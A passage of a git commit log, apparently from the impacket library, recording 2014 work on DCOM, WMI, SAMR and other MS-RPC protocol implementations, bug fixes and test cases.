     Drawback is it needs DCOM, hence, I have to be able to access
     DCOM ports at the target machine.

commit e0bbf550c6c6a8ac21463bc66fe4342fcdb1ff04
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Apr 15 16:57:22 2014 +0000

    Just a cosmetic fix so column separators are printed the same way as headers

commit b5aba39e3351d5720ec989aa1d2ab0c8fd1a43a9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Apr 14 20:40:31 2014 +0000

    Getting better..
    1) Changes on names for structures (all upper case) from all the WMIO part
    2) Now we're generating the methods for a class or instance on the fly, whenever they are called (check the ExecMethod example)
    3) wmiquery.py updates

commit 040a723ba0aee4278d26f43cf0361b0ce2e18b99
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Apr 11 21:14:11 2014 +0000

    DCOMConnection by default doesn't launch an OxidResolver thread. Not needed in most of the cases. Wmiquery.py needs it ;)

commit b85197c12afdfe8e8d72cdfacae618995c7183a7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Apr 11 21:12:39 2014 +0000

    More advance.. ExecQuery is starting to work. When calling GetObject, it will dynamically create the methods :)

commit 430b46ef3b25c6584a6931b6d50c49b4c12b3abf
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 9 20:42:50 2014 +0000

    Updates for testcases to work with DCOMConnection

commit 21365a76e4c20f83609e8ed2d69d3ee084e54200
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 9 20:07:23 2014 +0000

    typo on one method's name, it should be test_hSamrQueryDisplayInformation()

commit 431bce6543e5b2309872a851f04cb1c7852fd32d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 9 19:54:21 2014 +0000

    1) Implemented DCOMConnection() to encapsulate all the initial DCE/RPC connectivity
    2) Implemented a ping mechanism to mantain the objects alive in the target servers

commit 54af60449015e51786a5846042a34cb8c021a514
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 9 19:50:43 2014 +0000

    1) Adding support for CimTypeEnum.CIM_TYPE_OBJECT
    2) Fixed some typos on structure/methods definition

commit dc66234b2b9440bc8535c78b2986e7d957c958d4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Apr 8 15:05:39 2014 +0000

    Fix for https://code.google.com/p/impacket/issues/detail?id=41

commit 7c5cc44207cf805662be55e19f14180b5cce9b95
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Apr 7 17:02:18 2014 +0000

    Ability to specify an oxid when creating an interface

commit fa863a80fec27afb9e56de4ee8675286192103f3
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Apr 7 16:38:42 2014 +0000

    dcomrt.py: dcomrt now uses a single connection and performs alter_ctx to switch between rpc bindings instead of creating a new connection for each request. Big boost in performance.
    wmiquery.py: RemRelease shouldn't be done against the WBemObject, but against the Enumerator one

commit 8e523b437db038e028d7bb8e8e5b8ebf38793653
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Apr 6 22:06:36 2014 +0000

    Missed RemRelease for the iWbemServices instance

commit 45511be2193ab29f078cf805f9301684204042a4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Apr 6 20:54:40 2014 +0000

    wmi.py: methods for parsing the class for later use
    wmiquery.py: script to test wmiqueries easily ;)

commit 040da58b3dd115d7b1eb77b37cffc1d6664914c4
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Apr 5 19:27:43 2014 +0000

    Now method parameters are parsed/printed when calling GetObject

commit a86fde1a4cd01aff38f16d6e0ad41ebd9922b5a7
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Apr 5 16:11:38 2014 +0000

    Improvements to getProperties() and getValues()

commit 925e3f80776fbe96b34d880440d9ef907e4d6b42
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Apr 5 16:10:59 2014 +0000

    Setting up a high timeout for requests

commit 4ffcdf840c1337e53451abed2515acca2ff3bb3c
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Apr 5 01:47:54 2014 +0000

    [WMI-IO] is ugly.. but anyways.. almost there.. There are some errors triggered that I still gotta find the solution for.
    the updated testcase output is promising :)

commit f651ad06cef4b6ffe429c0085f45432761e67015
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 3 23:56:25 2014 +0000

    Adding the [MS_WMIO] part

commit d6c7c28f2c5065807a0cf83be1f8882cb151cfc5
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 3 21:11:56 2014 +0000

    test cases for wmi.py

commit d9a9cbbd7923fdee76b85c79f6a1f4afb97f9b29
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 3 21:10:41 2014 +0000

    [MS-WMI], just starting

commit b4461fa7bdeb8775aa63cf835a626d2812e28bbb
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 3 19:23:40 2014 +0000

    INTERFACE.process_interface(): iPid and Oxid is not present inside a OBJREF_CUSTOM

commit 4d1eb6191e1a08931486d528f7a79f0336d28bea
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 3 19:12:55 2014 +0000

    Adding PPMInterfacePointer()

commit 12570727931db2b1854728c37f7c927506c583bd
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 3 17:02:09 2014 +0000

    When calling alter_ctx we must update the ctx for the subsequent calls

commit df25a527624d30b917cbc50cef2a783dab1c5354
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 3 16:48:49 2014 +0000

    Fixed wrong constant value for DOMAIN_GROUP_RID_CONTROLLERS

commit 7e2f8a437156e417937ad28ad80d72839bebcd80
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 3 15:01:43 2014 +0000

    Added 2.2.32 LPCSTR

commit 78fb61599b2db8c8c4976764fc13afb7e3efabd5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Apr 1 18:58:56 2014 +0000

    Just changing some variable names

commit 2e91ea1e1674a86b7e907c06af15e1c281d6f4ec
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Apr 1 18:57:56 2014 +0000

    Added:
    1) IDispatch::GetIDsOfNames()
    2) IDispatch::Invoke()
    3) ITypeInfo::GetNames()
    4) ITypeInfo::GetTypeComp()

commit 3cb52bcae189e09d5547c86c39c15ecdb348889e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Apr 1 14:19:29 2014 +0000

    Added:
    1) SamrLookupNamesInDomain/hSamrLookupNamesInDomain
    2) SamrLookupIdsInDomain/hSamrLookupIdsInDomain
    
    Test cases also included

commit 18b92f63f4ae04c9ded1f38d25cb895ec3578752
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Mar 29 23:53:10 2014 +0000

    fromStringReferents() and fromStringReferent() now returns the amount of bytes they consumed. This makes it easier to update where we are reading at the packet buffer, instead of calling getDataReferent/s() methods, saving some time and making it more efficient.

commit 43df600cec844470ace66905f507f102f78b2ed2
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 28 20:55:07 2014 +0000

    Added ability to not align an Union in between the tag and the data itself. This is not the ideal solution, but I can't understand how pads are calculated there. More research needed, but for now the dcom runtime is back working.

commit 88e72104ae7db9fde13c13bd3646e67a092597d3
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 28 19:25:43 2014 +0000

    Reverting the change in alignment I did before. It breaks my test cases (just figured when dumping the responses), but reverting back brings other problems to the dcomrt. So... everything works except dcom, which is brand new.. so can't be still used until I figure things out.

commit 7e23ae31b009a658a728c92401020bc998df5b5e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 28 19:24:17 2014 +0000

    Comenting one request that doesn't work (was commented before)

commit d8da122268142ae7c05bb8b31c7e9ac121d564a0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 28 19:20:01 2014 +0000

    Uncommented all the dump() calls. This is an extra check to verify the data comes/is parsed the right way.
    
    When running these testcases, save the output to a file (or /dev/null) so you can see the normal test case output

commit 1de7787b0d2a6c73b0a7b5401a0741aefc156b66
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Mar 27 15:50:35 2014 +0000

    1) Added 'default' clause for NDRUNIONs
    2) Changed the alignment calculations for NDR32 in NDRUNIONS

commit b2155a2eef33273e4d70aaf1326b240f77cb0a2b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 25 23:54:19 2014 +0000

    1) Added ITypeInfo::GetFuncDesc()
    2) Finished ITypeInfo::GetTypeAttr()

commit 5bdc9cb3a0ede74af566ae13563a7113bbdd9c04
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 25 23:53:02 2014 +0000

    We don't want an extra CRLF when dumping enums

commit 376efb9462255275ec9e8cb96972d39c40c63ea6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 25 23:01:39 2014 +0000

    RemoteGetClassObject() now returns an IRemUnknown2

commit 669813e55d830bd9b68da4e82d74536801960bdb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 25 22:53:16 2014 +0000

    Bye

commit b25baab9cd7077d30dc28c195e3aaf31f5e746e6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 25 22:53:00 2014 +0000

    Added test case for RemoteGetClassObject()

commit 9e03d5d3cf66caca6790ac145814e243f13c4ee3
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 25 22:51:44 2014 +0000

    RemoteGetClassObject() now working

commit f50c86d9930e304646824aaa6f0ff7ce02b794fc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 25 19:33:57 2014 +0000

    New name, since we changed the module as well

commit 72ab89dccba6897f489e9e09702dac1f9ad2e236
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 25 19:33:25 2014 +0000

    Test cases more organized.. only using the helper classes/methods

commit 80265aa1c9da1916f031f9e369c1dfdb7882df29
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 25 19:20:56 2014 +0000

    1) self.__marshalled_iid not needed anymore.
    2) fixed IIDs in comev

commit 358f82afd6d001368ee886f25e929bb205e49e6b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 25 18:50:40 2014 +0000

    1) Added IObjectExporter::ResolveOxid(), IObjectExporter::SimplePing(), IObjectExporter::ComplexPing(), IObjectExporter::ServerAlive(), IObjectExporter::ResolveOxid2(), IObjectExporter::ServerAlive2()
    2) Added IActivation::RemoteActivation()
    3) Added IRemoteSCMActivator::RemoteGetClassObject(): Still not working

commit 2847a229267bb460efb1b7af36e780207de8ca9e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 25 18:45:56 2014 +0000

    Moved some definitions into the class constructors in order to get away the forward reference need

commit 2b4b6c5be0c60c6420db60a0f25ff2d8523b691d
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 25 00:37:06 2014 +0000

    Added targetIP to the INTERFACE constructor. This is needed for now, when parsing the stringBindinds in order to connect to the right machine

commit eb94713d28584cb99b50c736705b34f64845928d
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 25 00:36:11 2014 +0000

    Added get_rpc_transport()

commit 9023cfd7046cc3b338535e91836e0afeb197c1f4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Mar 24 22:23:58 2014 +0000

    Adding dcom directory to the install path

commit c31b00a7407410bdb8515e9e3faec90c739c2c62
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Mar 24 22:22:54 2014 +0000

    Stuff with various test cases while I develop the dcom runtime

commit 28cbc46779011d5c56937d5a00bdfc7f67e5dd39
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Mar 24 22:19:59 2014 +0000

    Bye

commit 388c8fd730bc061348de5ae22b62eb4045131d9d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Mar 24 22:19:07 2014 +0000

    DCOM Interfaces implemented (not complete).. Further testing needed, still way to go

commit 16c2781cbc2fe415591977a54aa54ec1f6c27573
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Mar 24 22:15:31 2014 +0000

    If it cannot find the module in the current directory, try the subdirectories

commit 70c75f245984909e232378e027dd08e9c3535dea
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Mar 24 21:56:40 2014 +0000

    Moving it to a different name. DCOM runtime

commit 7a69be9bb22b4410b5afcb5a2b0fcb4e1021e251
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Mar 24 21:36:59 2014 +0000

    More data types added

commit 55faa58b91e2b2ced18aa0256ed3c07940da0d7b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Mar 22 04:20:29 2014 +0000

    1) More dcom stuff
    2) added BSTR to dtypes

commit 44aafc96d933a121ce8d1451ec1ed6c3231a8445
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 21 19:35:48 2014 +0000

    Added an extra check trying to find the right error code when something goes wrong

commit 1d2a92e181d8ed1e72157f3eee7c8705df6fb420
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 21 19:35:03 2014 +0000

    Adding SHORT type

commit c96c2c08749a548fba869f2d870b3126ec95f580
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 21 14:49:10 2014 +0000

    Fixed bug in getServiceAccount() method. It wasn't using the parameter received pointing to the serviceName to get the running user from, instead it was using self.__serviceName!

commit acc0d50ae130c2c2409cdcd4798452ff6966c793
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Mar 20 21:34:34 2014 +0000

    more stuff on the DCOM saga.. still way behind doing something useful.. but getting closer

commit 6d04c633259124e7e2a485afc369b397ca00122a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 18 15:18:21 2014 +0000

    1) Added ability to specify an UUID inside the RPC Header (needed for DCOM)
    2) Whenever there's an RPC Error, it will look at HRESULT errors when printing the exception

commit e0ba0fb3b856b335947022a005b87ddb3863dac2
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 18 15:16:54 2014 +0000

    HRESULT Errors from [MS-ERREF].

commit f631e988934d8ca1d67bf58e2c0f691ecbe084ff
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 18 15:15:22 2014 +0000

    Added LONGLONG

commit 31b4fac3a448cbd67f4ce5a8a9650ba936842c05
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Mar 8 16:48:26 2014 +0000

    Adjusting some data types

commit b5140ea1261ea64a21d570c3dd36e6aa71d82734
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 4 19:00:45 2014 +0000

    Fix for https://code.google.com/p/impacket/issues/detail?id=39. Under Windows 2000, the NoLMHash registry key does not exist, and we weren't catching an exception under that situation. Should work now.

commit b262d7e8747a7e10390789525f6e4b9101db3db0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Feb 27 19:33:36 2014 +0000

    Fixed typo in hSamrEnumerateUsersInDomain(), the userAccountControl parameter was not being included in the DCE call

commit 35c4edbc74dbceadc708a3abff82380afaa2135a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Feb 26 16:20:19 2014 +0000

    Fix for https://code.google.com/p/impacket/issues/detail?id=38&thanks=38&ts=1393431491
    
    The lpClassIn buffer must be completed both at the MaximumCount and MaximumLength level, in order to work on WinXP

commit ddf21422925b068aa2519117b7e9e0cca6b7e09a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Feb 20 16:06:30 2014 +0000

    Added some try: except: clauses when parsing ntds.dit, since based on feedback from a user, when dumping a huge amount of accounts (over 1MM) there are some rows that might be corrupted, hence triggering a decoding error. This fix will report that problem and let the script to continue running.

commit bcfcf50ccdff1f3e165801b629c4d7dc59a16c02
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 17 20:27:11 2014 +0000

    Sync with CORE internal repository

commit 79442b597d1dbd30057f3a45b90fd619af750788
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 17 20:23:22 2014 +0000

    Sync with CORE internal repository

commit d806d50191a0a97c8bc17b8779caf9315d1621b9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 17 17:56:43 2014 +0000

    Sync with CORE internal repository

commit f7d9b6bbe6bdd1baa66febedd9f9fcadcefd5d4c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Feb 12 16:39:51 2014 +0000

    If we cannot open the SCMR, let's raise an exception so the target file uploaded is removed

commit 12202d942e9e1c488ff0c6e69ea546220890eb8f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Feb 11 15:13:03 2014 +0000

    Whenever we detect the target system has signature required, we print a warning message stating the attack will fail

commit eb07deaf0ddb21ce990a24376b0bbba0aa780bb7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 3 16:19:04 2014 +0000

    Updated home URL

commit 0a230f6097c8ab7fb1adebf505a12e28b8eac544
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 3 15:52:45 2014 +0000

    Typo at ScmReplyInfoData()

commit 5800faa508d9654ab1dae5b0a01f17184c239a3b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 3 02:28:10 2014 +0000

    Replacing evals() with getattr() :)

commit a5c52d22a9391cbb530b307b730c068efad56562
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Feb 2 20:45:10 2014 +0000

    dcom test cases so far

commit cf101a0c378780ba4c340693f2b58ca72ebeb409
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Feb 2 20:44:43 2014 +0000

    [MS-DCOM] Interface Implementation, just starting, way long to go.

commit 6b9d77576cdc5e1984432b73b054c564f28c0f0a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Feb 2 20:41:25 2014 +0000

    Forgot to marshal the referents for the Type1Serialization

commit 65049cdd1614f9140ca586716fa3fd8d2125a142
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Feb 1 18:06:37 2014 +0000

    Adding [MS-RPCE] 2.2.6 Type Serialization Version 1

commit d970afc2fe558f56adeb59f9da89320e5d5a4e54
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Feb 1 18:04:33 2014 +0000

    Adding HRESULT

commit 0cb3ac833c2feefac3569e57dbb85a0c52821c42
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 30 17:00:04 2014 +0000

    We're adding the UDP Transport back.. not yet fully functional

commit f81e61a94520680b35e237ce0ec7ff6c27d222dc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 30 16:59:20 2014 +0000

    Moving to next version 0.9.12-dev

commit 0d7f0f2710f16537c80b7679f75f0af3650e87f2
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 27 22:01:46 2014 +0000

    We'll be storing testcases inside /usr/share/doc/impacket

commit d04394011056e1c99c4faefef105f7ea769f83ea
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 27 21:00:37 2014 +0000

    Adding testcases to the source distribution

commit fbef39b5ef354e4b6b604a0298a81376a5519c7e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 27 20:22:33 2014 +0000

    Added setSessionKey(), we'll need it in the near future

commit 439791f587d58cfb5903956a853ed7d9f197f711
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 27 19:58:16 2014 +0000

    SMBConnection.listShares() ported to the new rpcrt

commit 5e31023011b49da2699a2eb6621d7053f15a5523
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 27 19:38:32 2014 +0000

    Another place to find ordereddict just in case it's not present

commit 42eb8721fca32b39004f56e02d5fe6cd38be405f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 27 19:00:46 2014 +0000

    Added experimental for some features

commit cb1b2e5a8bf51bdf61b5305a6ade8b9b38f7025b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 27 17:51:05 2014 +0000

    minor changes

commit 40b9cfab1e12c4ec211ede68a3936cf23edb7524
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 27 17:41:25 2014 +0000

    Typo with numberings

commit 7b6a75d913d686330fff041e5022d0ab30a69bab
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 27 17:40:19 2014 +0000

    Updated changelog

commit 9d504f8b5c486714a2c4e69d680bad623f05f90c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 27 14:24:59 2014 +0000

    No need to declare ndr.*

commit 753ca996807cead7e696c00d13abc952e8517056
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jan 25 22:38:46 2014 +0000

    Updated

commit a92d9dfa01db679fcf085bc7ff480b9b41459224
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jan 25 19:04:39 2014 +0000

    Wrong array set.. defaulting to RPC_UNICODE_STRING

commit 1d487efd944e296bdeb35bd444abe0a70c63adb6
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jan 25 18:38:23 2014 +0000

    1) Added more helper functions
    2) Checking whether NULL strings were sent to the helper functions

commit bf681a5ada6c018a37913fc9302b7863a64b3ec2
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jan 25 17:47:06 2014 +0000

    Adding LOCALTransport()

commit e2c10ac619c1bae5cb73bba6575f349aea2438e5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 22 20:08:04 2014 +0000

    dcerpc.v5 must be installed

commit 6fc2a346facc69fe01209034075fc7dc91b1b5bd
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 21 20:58:34 2014 +0000

    ntfs-read: stripping CRLF
    registry-read: forgot #!/usr/bin/python at the beginning

commit 0aa53f2175d1335f7431b7ad2824487512125a89
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 21 20:46:43 2014 +0000

    In preparation for new version

commit 4f522b22d0afd1e5e73c788de11c87f84a83e5ec
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 21 20:45:51 2014 +0000

    Stripping CRLF

commit 3f2237c3fa658331c13a1806b864fa07e78023b1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 21 20:40:06 2014 +0000

    Not needed anymore

commit 8763dbb2fa26d7c0e2f1927a122c6c28ed8dc359
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 21 19:44:16 2014 +0000

    Cosmetic changes

commit cbd52b52efb71862c13834b3b67c351ff31f2d10
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 20 14:13:58 2014 +0000

    test cases updated

commit eccfeb32cfd1abcd75f605a4c3a89f054c75f89b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jan 19 14:25:32 2014 +0000

    Ported to the new RPC runtime

commit 349116e6960275079d4dc753ffa833351ca3ef4b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jan 19 14:17:01 2014 +0000

    Notes added

commit bf1f93000a9f40c61e5c8377d9f25d5fa4d08050
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jan 19 13:56:06 2014 +0000

    Added checkNullString() to some helper functions to make it easier for the caller to consume them

commit b444686f028acbc6a2b7da585d5341af3658b50c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jan 19 13:55:08 2014 +0000

    Some helper functions added for nrpc

commit ec0ccde4985d143bd4d5c9c3b1b273fd8b807ecf
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 15 15:14:46 2014 +0000

    Helper functions for wkst + updated testcases

commit 62de6d31c2e072a94c1ab428bcc678205fc13319
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 15 03:21:05 2014 +0000

    1) helper functions added
    2) smbclient updated to use the helper functions

commit 850b6c7e3b8a7f5f344b4478117256335009038e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 14 22:15:30 2014 +0000

    Migrated to the helpers I just committed

commit 18fde7133d7c2329a858a7bf29187264bd64f68c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 14 22:08:43 2014 +0000

    Helper functions!

commit 94227f56a1bc9ed58f3efd7dc2acade54d83e5d4
